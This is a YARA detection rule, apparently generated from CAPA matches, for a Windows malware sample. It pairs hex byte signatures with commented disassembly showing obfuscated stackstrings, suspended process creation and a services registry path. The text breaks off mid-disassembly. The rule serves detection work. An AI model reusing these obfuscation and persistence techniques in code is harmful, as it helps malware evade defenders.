rule super_rule_9324d
{
    meta:
        author = "CAPA Matches"
        date_created = "EXPECTED_DATE"
        date_modified = "EXPECTED_DATE"
        description = ""
        md5 = "9324d1a8ae37a36ae560c37448c9705a"
    strings:
        /*
Basic Block at 0x00402f70@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - contain obfuscated stackstrings
        .text:0x00402f70  
        .text:0x00402f70  FUNC: int bfastcall_caller sub_00402f70( int eax, int edx, ) [1 XREFS] 
        .text:0x00402f70  
        .text:0x00402f70  Stack Variables: (offset from initial top of stack)
        .text:0x00402f70            -2: int local2
        .text:0x00402f70            -3: int local3
        .text:0x00402f70            -4: int local4
        .text:0x00402f70            -5: int local5
        .text:0x00402f70            -6: int local6
        .text:0x00402f70            -7: int local7
        .text:0x00402f70            -8: int local8
        .text:0x00402f70            -9: int local9
        .text:0x00402f70           -10: int local10
        .text:0x00402f70           -11: int local11
        .text:0x00402f70           -12: int local12
        .text:0x00402f70           -13: int local13
        .text:0x00402f70           -14: int local14
        .text:0x00402f70           -15: int local15
        .text:0x00402f70           -16: int local16
        .text:0x00402f70  
        .text:0x00402f70  83ec10           sub esp,16    ;int
        .text:0x00402f73  b06c             mov al,108
        .text:0x00402f75  8b1524a04000     mov edx,dword [0x0040a024]
        .text:0x00402f7b  88442401         mov byte [esp + 1],al
        .text:0x00402f7f  88442402         mov byte [esp + 2],al
        .text:0x00402f83  b04f             mov al,79
        .text:0x00402f85  8d4c2400         lea ecx,dword [esp]
        .text:0x00402f89  88442403         mov byte [esp + 3],al
        .text:0x00402f8d  8844240c         mov byte [esp + 12],al
        .text:0x00402f91  8b442414         mov eax,dword [esp + 20]
        .text:0x00402f95  c644240044       mov byte [esp],68
        .text:0x00402f9a  50               push eax
        .text:0x00402f9b  51               push ecx
        .text:0x00402f9c  52               push edx
        .text:0x00402f9d  6a00             push 0
        .text:0x00402f9f  c644241470       mov byte [esp + 20],112
        .text:0x00402fa4  c644241565       mov byte [esp + 21],101
        .text:0x00402fa9  c64424166e       mov byte [esp + 22],110
        .text:0x00402fae  c644241755       mov byte [esp + 23],85
        .text:0x00402fb3  c644241852       mov byte [esp + 24],82
        .text:0x00402fb8  c64424194c       mov byte [esp + 25],76
        .text:0x00402fbd  c644241a53       mov byte [esp + 26],83
        .text:0x00402fc2  c644241b48       mov byte [esp + 27],72
        .text:0x00402fc7  c644241d57       mov byte [esp + 29],87
        .text:0x00402fcc  c644241e00       mov byte [esp + 30],0
        .text:0x00402fd1  e81afaffff       call 0x004029f0    ;sub_004029f0(0,str_Consys21.dll_0040a02c,local16,sp+4)
        .text:0x00402fd6  33c0             xor eax,eax
        .text:0x00402fd8  83c420           add esp,32
        .text:0x00402fdb  c20400           ret 4
        */
        $c0 = { 83 EC 10 B0 6C 8B 15 ?? ?? ?? ?? 88 44 24 ?? 88 44 24 ?? B0 4F 8D 4C 24 ?? 88 44 24 ?? 88 44 24 ?? 8B 44 24 ?? C6 44 24 ?? 44 50 51 52 6A 00 C6 44 24 ?? 70 C6 44 24 ?? 65 C6 44 24 ?? 6E C6 44 24 ?? 55 C6 44 24 ?? 52 C6 44 24 ?? 4C C6 44 24 ?? 53 C6 44 24 ?? 48 C6 44 24 ?? 57 C6 44 24 ?? 00 E8 ?? ?? ?? ?? 33 C0 83 C4 20 C2 04 00 }
        /*
Basic Block at 0x00402fe0@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - contain obfuscated stackstrings
        .text:0x00402fe0  
        .text:0x00402fe0  FUNC: int bfastcall_caller sub_00402fe0( int eax, int edx, int ecx, int arg3, ) [1 XREFS] 
        .text:0x00402fe0  
        .text:0x00402fe0  Stack Variables: (offset from initial top of stack)
        .text:0x00402fe0             4: int arg3
        .text:0x00402fe0            -2: int local2
        .text:0x00402fe0            -3: int local3
        .text:0x00402fe0            -4: int local4
        .text:0x00402fe0            -5: int local5
        .text:0x00402fe0            -6: int local6
        .text:0x00402fe0            -7: int local7
        .text:0x00402fe0            -8: int local8
        .text:0x00402fe0            -9: int local9
        .text:0x00402fe0           -10: int local10
        .text:0x00402fe0           -11: int local11
        .text:0x00402fe0           -12: int local12
        .text:0x00402fe0           -13: int local13
        .text:0x00402fe0           -14: int local14
        .text:0x00402fe0           -15: int local15
        .text:0x00402fe0           -16: int local16
        .text:0x00402fe0  
        .text:0x00402fe0  83ec10           sub esp,16
        .text:0x00402fe3  8b1524a04000     mov edx,dword [0x0040a024]
        .text:0x00402fe9  b06c             mov al,108
        .text:0x00402feb  b144             mov cl,68
        .text:0x00402fed  88442401         mov byte [esp + 1],al
        .text:0x00402ff1  88442402         mov byte [esp + 2],al
        .text:0x00402ff5  8b442414         mov eax,dword [esp + 20]
        .text:0x00402ff9  884c2400         mov byte [esp],cl
        .text:0x00402ffd  884c240c         mov byte [esp + 12],cl
        .text:0x00403001  8d4c2400         lea ecx,dword [esp]
        .text:0x00403005  50               push eax
        .text:0x00403006  51               push ecx
        .text:0x00403007  52               push edx
        .text:0x00403008  6a00             push 0
        .text:0x0040300a  c64424134f       mov byte [esp + 19],79
        .text:0x0040300f  c644241470       mov byte [esp + 20],112
        .text:0x00403014  c644241565       mov byte [esp + 21],101
        .text:0x00403019  c64424166e       mov byte [esp + 22],110
        .text:0x0040301e  c644241755       mov byte [esp + 23],85
        .text:0x00403023  c644241852       mov byte [esp + 24],82
        .text:0x00403028  c64424194c       mov byte [esp + 25],76
        .text:0x0040302d  c644241a48       mov byte [esp + 26],72
        .text:0x00403032  c644241b49       mov byte [esp + 27],73
        .text:0x00403037  c644241d45       mov byte [esp + 29],69
        .text:0x0040303c  c644241e00       mov byte [esp + 30],0
        .text:0x00403041  e8aaf9ffff       call 0x004029f0    ;sub_004029f0(0,str_Consys21.dll_0040a02c,local16,arg3)
        .text:0x00403046  33c0             xor eax,eax
        .text:0x00403048  83c420           add esp,32
        .text:0x0040304b  c20400           ret 4
        */
        $c1 = { 83 EC 10 8B 15 ?? ?? ?? ?? B0 6C B1 44 88 44 24 ?? 88 44 24 ?? 8B 44 24 ?? 88 4C 24 ?? 88 4C 24 ?? 8D 4C 24 ?? 50 51 52 6A 00 C6 44 24 ?? 4F C6 44 24 ?? 70 C6 44 24 ?? 65 C6 44 24 ?? 6E C6 44 24 ?? 55 C6 44 24 ?? 52 C6 44 24 ?? 4C C6 44 24 ?? 48 C6 44 24 ?? 49 C6 44 24 ?? 45 C6 44 24 ?? 00 E8 ?? ?? ?? ?? 33 C0 83 C4 20 C2 04 00 }
        /*
Basic Block at 0x004030b0@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - contain obfuscated stackstrings
        .text:0x004030b0  
        .text:0x004030b0  FUNC: int bfastcall_caller sub_004030b0( int eax, int edx, ) [1 XREFS] 
        .text:0x004030b0  
        .text:0x004030b0  Stack Variables: (offset from initial top of stack)
        .text:0x004030b0            -4: int local4
        .text:0x004030b0            -5: int local5
        .text:0x004030b0            -6: int local6
        .text:0x004030b0            -7: int local7
        .text:0x004030b0            -8: int local8
        .text:0x004030b0            -9: int local9
        .text:0x004030b0           -10: int local10
        .text:0x004030b0           -11: int local11
        .text:0x004030b0           -12: int local12
        .text:0x004030b0           -13: int local13
        .text:0x004030b0           -14: int local14
        .text:0x004030b0           -15: int local15
        .text:0x004030b0           -16: int local16
        .text:0x004030b0  
        .text:0x004030b0  83ec10           sub esp,16    ;int
        .text:0x004030b3  8b1524a04000     mov edx,dword [0x0040a024]
        .text:0x004030b9  b06c             mov al,108
        .text:0x004030bb  88442401         mov byte [esp + 1],al
        .text:0x004030bf  88442402         mov byte [esp + 2],al
        .text:0x004030c3  8b442414         mov eax,dword [esp + 20]
        .text:0x004030c7  8d4c2400         lea ecx,dword [esp]
        .text:0x004030cb  50               push eax
        .text:0x004030cc  51               push ecx
        .text:0x004030cd  52               push edx
        .text:0x004030ce  6a00             push 0
        .text:0x004030d0  c644241044       mov byte [esp + 16],68
        .text:0x004030d5  c644241350       mov byte [esp + 19],80
        .text:0x004030da  c644241472       mov byte [esp + 20],114
        .text:0x004030df  c64424156f       mov byte [esp + 21],111
        .text:0x004030e4  c644241678       mov byte [esp + 22],120
        .text:0x004030e9  c644241779       mov byte [esp + 23],121
        .text:0x004030ee  c64424184f       mov byte [esp + 24],79
        .text:0x004030f3  c644241970       mov byte [esp + 25],112
        .text:0x004030f8  c644241a65       mov byte [esp + 26],101
        .text:0x004030fd  c644241b6e       mov byte [esp + 27],110
        .text:0x00403102  c644241c00       mov byte [esp + 28],0
        .text:0x00403107  e8e4f8ffff       call 0x004029f0    ;sub_004029f0(0,str_Consys21.dll_0040a02c,local16,sp+4)
        .text:0x0040310c  33c0             xor eax,eax
        .text:0x0040310e  83c420           add esp,32
        .text:0x00403111  c20400           ret 4
        */
        $c2 = { 83 EC 10 8B 15 ?? ?? ?? ?? B0 6C 88 44 24 ?? 88 44 24 ?? 8B 44 24 ?? 8D 4C 24 ?? 50 51 52 6A 00 C6 44 24 ?? 44 C6 44 24 ?? 50 C6 44 24 ?? 72 C6 44 24 ?? 6F C6 44 24 ?? 78 C6 44 24 ?? 79 C6 44 24 ?? 4F C6 44 24 ?? 70 C6 44 24 ?? 65 C6 44 24 ?? 6E C6 44 24 ?? 00 E8 ?? ?? ?? ?? 33 C0 83 C4 20 C2 04 00 }
        /*
Basic Block at 0x004031a0@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - contain obfuscated stackstrings
        .text:0x004031a0  
        .text:0x004031a0  FUNC: int bfastcall_caller sub_004031a0( int eax, int edx, ) [2 XREFS] 
        .text:0x004031a0  
        .text:0x004031a0  Stack Variables: (offset from initial top of stack)
        .text:0x004031a0            -3: int local3
        .text:0x004031a0            -4: int local4
        .text:0x004031a0            -5: int local5
        .text:0x004031a0            -6: int local6
        .text:0x004031a0            -7: int local7
        .text:0x004031a0            -8: int local8
        .text:0x004031a0            -9: int local9
        .text:0x004031a0           -10: int local10
        .text:0x004031a0           -11: int local11
        .text:0x004031a0           -12: int local12
        .text:0x004031a0           -13: int local13
        .text:0x004031a0           -14: int local14
        .text:0x004031a0           -15: int local15
        .text:0x004031a0           -16: int local16
        .text:0x004031a0  
        .text:0x004031a0  83ec10           sub esp,16
        .text:0x004031a3  b06c             mov al,108
        .text:0x004031a5  8b1524a04000     mov edx,dword [0x0040a024]
        .text:0x004031ab  88442401         mov byte [esp + 1],al
        .text:0x004031af  88442402         mov byte [esp + 2],al
        .text:0x004031b3  b06f             mov al,111
        .text:0x004031b5  8d4c2400         lea ecx,dword [esp]
        .text:0x004031b9  88442404         mov byte [esp + 4],al
        .text:0x004031bd  8844240b         mov byte [esp + 11],al
        .text:0x004031c1  8b442414         mov eax,dword [esp + 20]
        .text:0x004031c5  c644240044       mov byte [esp],68
        .text:0x004031ca  50               push eax
        .text:0x004031cb  51               push ecx
        .text:0x004031cc  52               push edx
        .text:0x004031cd  6a00             push 0
        .text:0x004031cf  c644241353       mov byte [esp + 19],83
        .text:0x004031d4  c644241572       mov byte [esp + 21],114
        .text:0x004031d9  c644241674       mov byte [esp + 22],116
        .text:0x004031de  c644241757       mov byte [esp + 23],87
        .text:0x004031e3  c644241869       mov byte [esp + 24],105
        .text:0x004031e8  c64424196e       mov byte [esp + 25],110
        .text:0x004031ed  c644241a64       mov byte [esp + 26],100
        .text:0x004031f2  c644241c77       mov byte [esp + 28],119
        .text:0x004031f7  c644241d00       mov byte [esp + 29],0
        .text:0x004031fc  e8eff7ffff       call 0x004029f0    ;sub_004029f0(0,str_Consys21.dll_0040a02c,local16,sp+4)
        .text:0x00403201  a3c4a94000       mov dword [0x0040a9c4],eax
        .text:0x00403206  33c0             xor eax,eax
        .text:0x00403208  83c420           add esp,32
        .text:0x0040320b  c20400           ret 4
        */
        $c3 = { 83 EC 10 B0 6C 8B 15 ?? ?? ?? ?? 88 44 24 ?? 88 44 24 ?? B0 6F 8D 4C 24 ?? 88 44 24 ?? 88 44 24 ?? 8B 44 24 ?? C6 44 24 ?? 44 50 51 52 6A 00 C6 44 24 ?? 53 C6 44 24 ?? 72 C6 44 24 ?? 74 C6 44 24 ?? 57 C6 44 24 ?? 69 C6 44 24 ?? 6E C6 44 24 ?? 64 C6 44 24 ?? 77 C6 44 24 ?? 00 E8 ?? ?? ?? ?? A3 ?? ?? ?? ?? 33 C0 83 C4 20 C2 04 00 }
        /*
Basic Block at 0x004032e0@9324d1a8ae37a36ae560c37448c9705a with 3 features:
          - contain obfuscated stackstrings
          - create process on Windows
          - create process suspended
        .text:0x004032e0  loc_004032e0: [1 XREFS]
        .text:0x004032e0  b910000000       mov ecx,16
        .text:0x004032e5  33c0             xor eax,eax
        .text:0x004032e7  8d7c2434         lea edi,dword [esp + 52]
        .text:0x004032eb  ba44000000       mov edx,68
        .text:0x004032f0  f3ab             rep: stosd 
        .text:0x004032f2  b061             mov al,97
        .text:0x004032f4  b174             mov cl,116
        .text:0x004032f6  88442415         mov byte [esp + 21],al
        .text:0x004032fa  8844241b         mov byte [esp + 27],al
        .text:0x004032fe  8d442410         lea eax,dword [esp + 16]
        .text:0x00403302  6a00             push 0
        .text:0x00403304  89542434         mov dword [esp + 52],edx
        .text:0x00403308  c644241457       mov byte [esp + 20],87
        .text:0x0040330d  c644241569       mov byte [esp + 21],105
        .text:0x00403312  c64424166e       mov byte [esp + 22],110
        .text:0x00403317  c644241753       mov byte [esp + 23],83
        .text:0x0040331c  884c2418         mov byte [esp + 24],cl
        .text:0x00403320  c644241a30       mov byte [esp + 26],48
        .text:0x00403325  c644241b5c       mov byte [esp + 27],92
        .text:0x0040332a  8854241c         mov byte [esp + 28],dl
        .text:0x0040332e  c644241d65       mov byte [esp + 29],101
        .text:0x00403333  c644241e66       mov byte [esp + 30],102
        .text:0x00403338  c644242075       mov byte [esp + 32],117
        .text:0x0040333d  c64424216c       mov byte [esp + 33],108
        .text:0x00403342  884c2422         mov byte [esp + 34],cl
        .text:0x00403346  c644242300       mov byte [esp + 35],0
        .text:0x0040334b  8944243c         mov dword [esp + 60],eax
        .text:0x0040334f  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00403351  8d4c2420         lea ecx,dword [esp + 32]
        .text:0x00403355  8d542430         lea edx,dword [esp + 48]
        .text:0x00403359  51               push ecx
        .text:0x0040335a  52               push edx
        .text:0x0040335b  6a00             push 0
        .text:0x0040335d  6a00             push 0
        .text:0x0040335f  6a00             push 0
        .text:0x00403361  6a00             push 0
        .text:0x00403363  6a00             push 0
        .text:0x00403365  6a00             push 0
        .text:0x00403367  53               push ebx
        .text:0x00403368  6a00             push 0
        .text:0x0040336a  ff15c0904000     call dword [0x004090c0]    ;kernel32.CreateProcessA(0,<0x004032a8>,0,0,0,0,0,0,local68,local84)
        .text:0x00403370  6a00             push 0
        .text:0x00403372  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00403374  5f               pop edi
        .text:0x00403375  5e               pop esi
        .text:0x00403376  5d               pop ebp
        .text:0x00403377  b801000000       mov eax,1
        .text:0x0040337c  5b               pop ebx
        .text:0x0040337d  83c464           add esp,100
        .text:0x00403380  c20400           ret 4
        */
        $c4 = { B9 10 00 00 00 33 C0 8D 7C 24 ?? BA 44 00 00 00 F3 AB B0 61 B1 74 88 44 24 ?? 88 44 24 ?? 8D 44 24 ?? 6A 00 89 54 24 ?? C6 44 24 ?? 57 C6 44 24 ?? 69 C6 44 24 ?? 6E C6 44 24 ?? 53 88 4C 24 ?? C6 44 24 ?? 30 C6 44 24 ?? 5C 88 54 24 ?? C6 44 24 ?? 65 C6 44 24 ?? 66 C6 44 24 ?? 75 C6 44 24 ?? 6C 88 4C 24 ?? C6 44 24 ?? 00 89 44 24 ?? FF D6 8D 4C 24 ?? 8D 54 24 ?? 51 52 6A 00 6A 00 6A 00 6A 00 6A 00 6A 00 53 6A 00 FF 15 ?? ?? ?? ?? 6A 00 FF D6 5F 5E 5D B8 01 00 00 00 5B 83 C4 64 C2 04 00 }
        /*
Basic Block at 0x00403390@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - contain obfuscated stackstrings
        .text:0x00403390  
        .text:0x00403390  FUNC: int cdecl sub_00403390( int arg0, int arg1, int arg2, ) [4 XREFS] 
        .text:0x00403390  
        .text:0x00403390  Stack Variables: (offset from initial top of stack)
        .text:0x00403390            12: int arg2
        .text:0x00403390             8: int arg1
        .text:0x00403390             4: int arg0
        .text:0x00403390          -1023: int local1023
        .text:0x00403390          -1024: int local1024
        .text:0x00403390          -1028: int local1028
        .text:0x00403390          -1029: int local1029
        .text:0x00403390          -1030: int local1030
        .text:0x00403390          -1031: int local1031
        .text:0x00403390          -1032: int local1032
        .text:0x00403390          -1033: int local1033
        .text:0x00403390          -1034: int local1034
        .text:0x00403390          -1035: int local1035
        .text:0x00403390          -1036: int local1036
        .text:0x00403390          -1037: int local1037
        .text:0x00403390          -1038: int local1038
        .text:0x00403390          -1039: int local1039
        .text:0x00403390          -1040: int local1040
        .text:0x00403390          -1041: int local1041
        .text:0x00403390          -1042: int local1042
        .text:0x00403390          -1043: int local1043
        .text:0x00403390          -1044: int local1044
        .text:0x00403390          -1045: int local1045
        .text:0x00403390          -1046: int local1046
        .text:0x00403390          -1047: int local1047
        .text:0x00403390          -1048: int local1048
        .text:0x00403390          -1049: int local1049
        .text:0x00403390          -1050: int local1050
        .text:0x00403390          -1051: int local1051
        .text:0x00403390          -1052: int local1052
        .text:0x00403390          -1053: int local1053
        .text:0x00403390          -1054: int local1054
        .text:0x00403390          -1055: int local1055
        .text:0x00403390          -1056: int local1056
        .text:0x00403390          -1057: int local1057
        .text:0x00403390          -1058: int local1058
        .text:0x00403390          -1059: int local1059
        .text:0x00403390          -1060: int local1060
        .text:0x00403390          -1061: int local1061
        .text:0x00403390          -1062: int local1062
        .text:0x00403390          -1063: int local1063
        .text:0x00403390          -1064: int local1064
        .text:0x00403390  
        .text:0x00403390  81ec28040000     sub esp,1064
        .text:0x00403396  56               push esi
        .text:0x00403397  57               push edi
        .text:0x00403398  b9ff000000       mov ecx,255
        .text:0x0040339d  33c0             xor eax,eax
        .text:0x0040339f  8d7c2431         lea edi,dword [esp + 49]
        .text:0x004033a3  c644243000       mov byte [esp + 48],0
        .text:0x004033a8  f3ab             rep: stosd 
        .text:0x004033aa  8b3578904000     mov esi,dword [0x00409078]
        .text:0x004033b0  6a00             push 0
        .text:0x004033b2  66ab             stosd 
        .text:0x004033b4  aa               stosb 
        .text:0x004033b5  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004033b7  b900010000       mov ecx,256
        .text:0x004033bc  33c0             xor eax,eax
        .text:0x004033be  8d7c2430         lea edi,dword [esp + 48]
        .text:0x004033c2  50               push eax
        .text:0x004033c3  f3ab             rep: stosd 
        .text:0x004033c5  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004033c7  b065             mov al,101
        .text:0x004033c9  b253             mov dl,83
        .text:0x004033cb  88442413         mov byte [esp + 19],al
        .text:0x004033cf  8844241e         mov byte [esp + 30],al
        .text:0x004033d3  88442422         mov byte [esp + 34],al
        .text:0x004033d7  88442427         mov byte [esp + 39],al
        .text:0x004033db  b172             mov cl,114
        .text:0x004033dd  b073             mov al,115
        .text:0x004033df  6a00             push 0
        .text:0x004033e1  8854240c         mov byte [esp + 12],dl
        .text:0x004033e5  c644240d59       mov byte [esp + 13],89
        .text:0x004033ea  8854240e         mov byte [esp + 14],dl
        .text:0x004033ee  c644240f54       mov byte [esp + 15],84
        .text:0x004033f3  c644241045       mov byte [esp + 16],69
        .text:0x004033f8  c64424114d       mov byte [esp + 17],77
        .text:0x004033fd  c64424125c       mov byte [esp + 18],92
        .text:0x00403402  c644241343       mov byte [esp + 19],67
        .text:0x00403407  c644241475       mov byte [esp + 20],117
        .text:0x0040340c  884c2415         mov byte [esp + 21],cl
        .text:0x00403410  884c2416         mov byte [esp + 22],cl
        .text:0x00403414  c64424186e       mov byte [esp + 24],110
        .text:0x00403419  c644241974       mov byte [esp + 25],116
        .text:0x0040341e  c644241a43       mov byte [esp + 26],67
        .text:0x00403423  c644241b6f       mov byte [esp + 27],111
        .text:0x00403428  c644241c6e       mov byte [esp + 28],110
        .text:0x0040342d  c644241d74       mov byte [esp + 29],116
        .text:0x00403432  884c241e         mov byte [esp + 30],cl
        .text:0x00403436  c644241f6f       mov byte [esp + 31],111
        .text:0x0040343b  c64424206c       mov byte [esp + 32],108
        .text:0x00403440  88542421         mov byte [esp + 33],dl
        .text:0x00403444  c644242374       mov byte [esp + 35],116
        .text:0x00403449  c64424245c       mov byte [esp + 36],92
        .text:0x0040344e  88542425         mov byte [esp + 37],dl
        .text:0x00403452  884c2427         mov byte [esp + 39],cl
        .text:0x00403456  c644242876       mov byte [esp + 40],118
        .text:0x0040345b  c644242969       mov byte [esp + 41],105
        .text:0x00403460  c644242a63       mov byte [esp + 42],99
        .text:0x00403465  8844242c         mov byte [esp + 44],al
        .text:0x00403469  c644242d5c       mov byte [esp + 45],92
        .text:0x0040346e  c644242e25       mov byte [esp + 46],37
        .text:0x00403473  8844242f         mov byte [esp + 47],al
        .text:0x00403477  c644243000       mov byte [esp + 48],0
        .text:0x0040347c  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040347e  8b842434040000   mov eax,dword [esp + 1076]
        .text:0x00403485  8d4c2408         lea ecx,dword [esp + 8]
        .text:0x00403489  50               push eax
        .text:0x0040348a  8d542434         lea edx,dword [esp + 52]
        .text:0x0040348e  51               push ecx
        .text:0x0040348f  52               push edx
        .text:0x00403490  ff15d8914000     call dword [0x004091d8]    ;user32.wsprintfA(local1024,local1064)
        .text:0x00403496  83c40c           add esp,12
        .text:0x00403499  6a00             push 0
        .text:0x0040349b  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040349d  8bbc243c040000   mov edi,dword [esp + 1084]
        .text:0x004034a4  6a00             push 0
        .text:0x004034a6  57               push edi
        .text:0x004034a7  ff15c4904000     call dword [0x004090c4]    ;kernel32.lstrlenA(arg2)
        .text:0x004034ad  50               push eax
        .text:0x004034ae  8b842440040000   mov eax,dword [esp + 1088]
        .text:0x004034b5  57               push edi
        .text:0x004034b6  6a01             push 1
        .text:0x004034b8  50               push eax
        .text:0x004034b9  8d4c2444         lea ecx,dword [esp + 68]
        .text:0x004034bd  51               push ecx
        .text:0x004034be  6802000080       push 0x80000002
        .text:0x004034c3  e818170000       call 0x00404be0    ;sub_00404be0(0x80000002,local1024,arg1,1,arg2,kernel32.lstrlenA(arg2),0)
        .text:0x004034c8  83c41c           add esp,28
        .text:0x004034cb  6a00             push 0
        .text:0x004034cd  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004034cf  5f               pop edi
        .text:0x004034d0  5e               pop esi
        .text:0x004034d1  81c428040000     add esp,1064
        .text:0x004034d7  c3               ret 
        */
        $c5 = { 81 EC 28 04 00 00 56 57 B9 FF 00 00 00 33 C0 8D 7C 24 ?? C6 44 24 ?? 00 F3 AB 8B 35 ?? ?? ?? ?? 6A 00 66 AB AA FF D6 B9 00 01 00 00 33 C0 8D 7C 24 ?? 50 F3 AB FF D6 B0 65 B2 53 88 44 24 ?? 88 44 24 ?? 88 44 24 ?? 88 44 24 ?? B1 72 B0 73 6A 00 88 54 24 ?? C6 44 24 ?? 59 88 54 24 ?? C6 44 24 ?? 54 C6 44 24 ?? 45 C6 44 24 ?? 4D C6 44 24 ?? 5C C6 44 24 ?? 43 C6 44 24 ?? 75 88 4C 24 ?? 88 4C 24 ?? C6 44 24 ?? 6E C6 44 24 ?? 74 C6 44 24 ?? 43 C6 44 24 ?? 6F C6 44 24 ?? 6E C6 44 24 ?? 74 88 4C 24 ?? C6 44 24 ?? 6F C6 44 24 ?? 6C 88 54 24 ?? C6 44 24 ?? 74 C6 44 24 ?? 5C 88 54 24 ?? 88 4C 24 ?? C6 44 24 ?? 76 C6 44 24 ?? 69 C6 44 24 ?? 63 88 44 24 ?? C6 44 24 ?? 5C C6 44 24 ?? 25 88 44 24 ?? C6 44 24 ?? 00 FF D6 8B 84 24 ?? ?? ?? ?? 8D 4C 24 ?? 50 8D 54 24 ?? 51 52 FF 15 ?? ?? ?? ?? 83 C4 0C 6A 00 FF D6 8B BC 24 ?? ?? ?? ?? 6A 00 57 FF 15 ?? ?? ?? ?? 50 8B 84 24 ?? ?? ?? ?? 57 6A 01 50 8D 4C 24 ?? 51 68 02 00 00 80 E8 ?? ?? ?? ?? 83 C4 1C 6A 00 FF D6 5F 5E 81 C4 28 04 00 00 C3 }
        /*
Basic Block at 0x00404cd0@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - contain obfuscated stackstrings
        .text:0x00404cd0  
        .text:0x00404cd0  FUNC: int cdecl sub_00404cd0( ) [2 XREFS] 
        .text:0x00404cd0  
        .text:0x00404cd0  Stack Variables: (offset from initial top of stack)
        .text:0x00404cd0            -2: int local2
        .text:0x00404cd0            -3: int local3
        .text:0x00404cd0            -4: int local4
        .text:0x00404cd0            -5: int local5
        .text:0x00404cd0            -6: int local6
        .text:0x00404cd0            -7: int local7
        .text:0x00404cd0            -8: int local8
        .text:0x00404cd0            -9: int local9
        .text:0x00404cd0           -10: int local10
        .text:0x00404cd0           -11: int local11
        .text:0x00404cd0           -12: int local12
        .text:0x00404cd0           -13: int local13
        .text:0x00404cd0           -14: int local14
        .text:0x00404cd0           -15: int local15
        .text:0x00404cd0           -16: int local16
        .text:0x00404cd0           -17: int local17
        .text:0x00404cd0           -18: int local18
        .text:0x00404cd0           -19: int local19
        .text:0x00404cd0           -20: int local20
        .text:0x00404cd0           -21: int local21
        .text:0x00404cd0           -22: int local22
        .text:0x00404cd0           -23: int local23
        .text:0x00404cd0           -24: int local24
        .text:0x00404cd0           -25: int local25
        .text:0x00404cd0           -26: int local26
        .text:0x00404cd0           -27: int local27
        .text:0x00404cd0           -28: int local28
        .text:0x00404cd0           -29: int local29
        .text:0x00404cd0           -30: int local30
        .text:0x00404cd0           -31: int local31
        .text:0x00404cd0           -32: int local32
        .text:0x00404cd0           -33: int local33
        .text:0x00404cd0           -34: int local34
        .text:0x00404cd0           -35: int local35
        .text:0x00404cd0           -36: int local36
        .text:0x00404cd0           -37: int local37
        .text:0x00404cd0           -38: int local38
        .text:0x00404cd0           -39: int local39
        .text:0x00404cd0           -40: int local40
        .text:0x00404cd0           -41: int local41
        .text:0x00404cd0           -42: int local42
        .text:0x00404cd0           -43: int local43
        .text:0x00404cd0           -44: int local44
        .text:0x00404cd0           -45: int local45
        .text:0x00404cd0           -46: int local46
        .text:0x00404cd0           -47: int local47
        .text:0x00404cd0           -48: int local48
        .text:0x00404cd0           -52: int local52
        .text:0x00404cd0           -53: int local53
        .text:0x00404cd0           -54: int local54
        .text:0x00404cd0           -55: int local55
        .text:0x00404cd0           -56: int local56
        .text:0x00404cd0           -60: int local60
        .text:0x00404cd0           -64: int local64
        .text:0x00404cd0           -68: int local68
        .text:0x00404cd0           -72: int local72
        .text:0x00404cd0  
        .text:0x00404cd0  83ec48           sub esp,72
        .text:0x00404cd3  53               push ebx
        .text:0x00404cd4  b344             mov bl,68
        .text:0x00404cd6  b145             mov cl,69
        .text:0x00404cd8  885c241f         mov byte [esp + 31],bl
        .text:0x00404cdc  885c2425         mov byte [esp + 37],bl
        .text:0x00404ce0  884c2423         mov byte [esp + 35],cl
        .text:0x00404ce4  884c2426         mov byte [esp + 38],cl
        .text:0x00404ce8  b353             mov bl,83
        .text:0x00404cea  b804000000       mov eax,4
        .text:0x00404cef  b149             mov cl,73
        .text:0x00404cf1  885c2427         mov byte [esp + 39],bl
        .text:0x00404cf5  885c2431         mov byte [esp + 49],bl
        .text:0x00404cf9  89442408         mov dword [esp + 8],eax
        .text:0x00404cfd  8944240c         mov dword [esp + 12],eax
        .text:0x00404d01  884c242a         mov byte [esp + 42],cl
        .text:0x00404d05  884c242d         mov byte [esp + 45],cl
        .text:0x00404d09  b373             mov bl,115
        .text:0x00404d0b  b041             mov al,65
        .text:0x00404d0d  b252             mov dl,82
        .text:0x00404d0f  b174             mov cl,116
        .text:0x00404d11  885c2433         mov byte [esp + 51],bl
        .text:0x00404d15  885c2444         mov byte [esp + 68],bl
        .text:0x00404d19  885c2445         mov byte [esp + 69],bl
        .text:0x00404d1d  8844241d         mov byte [esp + 29],al
        .text:0x00404d21  8854241e         mov byte [esp + 30],dl
        .text:0x00404d25  88442421         mov byte [esp + 33],al
        .text:0x00404d29  88542422         mov byte [esp + 34],dl
        .text:0x00404d2d  88542429         mov byte [esp + 41],dl
        .text:0x00404d31  884c2434         mov byte [esp + 52],cl
        .text:0x00404d35  884c243b         mov byte [esp + 59],cl
        .text:0x00404d39  33db             xor ebx,ebx
        .text:0x00404d3b  56               push esi
        .text:0x00404d3c  8b3578904000     mov esi,dword [0x00409078]
        .text:0x00404d42  b05c             mov al,92
        .text:0x00404d44  b265             mov dl,101
        .text:0x00404d46  b172             mov cl,114
        .text:0x00404d48  53               push ebx
        .text:0x00404d49  c644242448       mov byte [esp + 36],72
        .text:0x00404d4e  c644242857       mov byte [esp + 40],87
        .text:0x00404d53  8844242c         mov byte [esp + 44],al
        .text:0x00404d57  c644243043       mov byte [esp + 48],67
        .text:0x00404d5c  c644243350       mov byte [esp + 51],80
        .text:0x00404d61  c644243454       mov byte [esp + 52],84
        .text:0x00404d66  c64424364f       mov byte [esp + 54],79
        .text:0x00404d6b  c64424374e       mov byte [esp + 55],78
        .text:0x00404d70  88442438         mov byte [esp + 56],al
        .text:0x00404d74  c644243a79       mov byte [esp + 58],121
        .text:0x00404d79  8854243d         mov byte [esp + 61],dl
        .text:0x00404d7d  c644243e6d       mov byte [esp + 62],109
        .text:0x00404d82  8844243f         mov byte [esp + 63],al
